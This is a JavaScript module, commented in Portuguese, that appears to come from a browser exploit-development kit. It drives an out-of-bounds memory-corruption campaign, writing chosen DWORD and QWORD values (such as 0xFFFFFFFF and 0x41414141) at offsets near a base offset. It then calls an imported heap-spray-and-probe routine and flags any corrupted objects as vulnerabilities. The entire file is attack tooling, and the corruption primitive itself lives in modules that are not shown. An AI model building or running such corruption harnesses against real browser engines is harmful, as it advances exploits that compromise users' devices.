// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeSprayAndProbeWithCorruptionParams } from './testSprayComplexObjects_v2.mjs'; // ATUALIZE O NOME DO ARQUIVO SE VOCÊ SALVOU DIFERENTE
import { OOB_CONFIG } from '../config.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';

async function runAggressiveCorruptionAndProbeStrategy() {
    const FNAME_RUNNER = "runAggressiveCorruptionAndProbeStrategy";
    logS3(`==== INICIANDO Estratégia de Corrupção Agressiva e Sondagem de MyComplexObject ====`, 'test', FNAME_RUNNER);

    // Definição dos parâmetros de corrupção a serem testados
    const corruption_params_list = [
        // Variações de Valor no offset 0x70 (DWORD)
        { offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0xFFFFFFFF, size: 4, id: "ValFFFFFFFF_Off70_4B" },
        { offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0x00000000, size: 4, id: "Val0_Off70_4B" },
        { offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0x00000001, size: 4, id: "Val1_Off70_4B" },
        { offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0x41414141, size: 4, id: "Val4141_Off70_4B" },

        // Variações de Valor no offset 0x70 (QWORD)
        { offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF), size: 8, id: "ValFFFFFFFF_FFFFFFFF_Off70_8B" },
        { offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: new AdvancedInt64(0,0), size: 8, id: "Val0_0_Off70_8B" },
        { offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: new AdvancedInt64("0x4141414141414141"), size: 8, id: "Val4141_4141_Off70_8B" },

        // Variações de Offset com valor 0xFFFFFFFF (DWORD)
        { offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 24, value: 0xFFFFFFFF, size: 4, id: "ValFFFFFFFF_Off68_4B" }, // 0x68
        { offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 20, value: 0xFFFFFFFF, size: 4, id: "ValFFFFFFFF_Off6C_4B" }, // 0x6C
        { offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 12, value: 0xFFFFFFFF, size: 4, id: "ValFFFFFFFF_Off74_4B" }, // 0x74
        { offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 8,  value: 0xFFFFFFFF, size: 4, id: "ValFFFFFFFF_Off78_4B" }, // 0x78
    ];

    let any_corruption_found = false;

    for (const params of corruption_params_list) {
        const result = await executeSprayAndProbeWithCorruptionParams({
            corruption_offset: params.offset,
            corruption_value: params.value,
            corruption_size: params.size,
            test_id_suffix: params.id
        });

        if (result && (result.error || result.initialIntegrityOK === false)) {
            any_corruption_found = true;
            logS3(`   ---> PROBLEMA SIGNIFICATIVO DETECTADO com ${params.id}. Verifique os logs detalhados.`, "critical", FNAME_RUNNER);
            // Você pode decidir parar aqui se um resultado "interessante" for encontrado
            // document.title = `CRITICAL FIND: ${params.id}`;
            // break;
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa entre os diferentes tipos de corrupção
         if (document.title.startsWith("PROBLEM") || document.title.startsWith("CRASH")) break;
    }

    if (any_corruption_found) {
        logS3("Um ou mais testes de corrupção agressiva indicaram problemas!", "vuln", FNAME_RUNNER);
    } else {
        logS3("Nenhuma corrupção óbvia detectada nos objetos MyComplexObject com os parâmetros testados.", "good", FNAME_RUNNER);
    }

    logS3(`==== Estratégia de Corrupção Agressiva e Sondagem CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_AggressiveCorruption';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Teste de Corrupção Agressiva em MyComplexObject ====`, 'test', FNAME);
    document.title = "Iniciando Script 3 - Aggro Corrupt MyComplexObj";

    await runAggressiveCorruptionAndProbeStrategy();

    logS3(`\n==== Script 3 CONCLUÍDO (Teste de Corrupção Agressiva em MyComplexObject) ====`, 'test', FNAME);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("PROBLEM") || document.title.includes("CRITICAL") || document.title.includes("ERRO")) {
        // Manter títulos que indicam resultados específicos
    }
    else {
        document.title = "Script 3 Concluído - Aggro Corrupt MyComplexObj";
    }
}
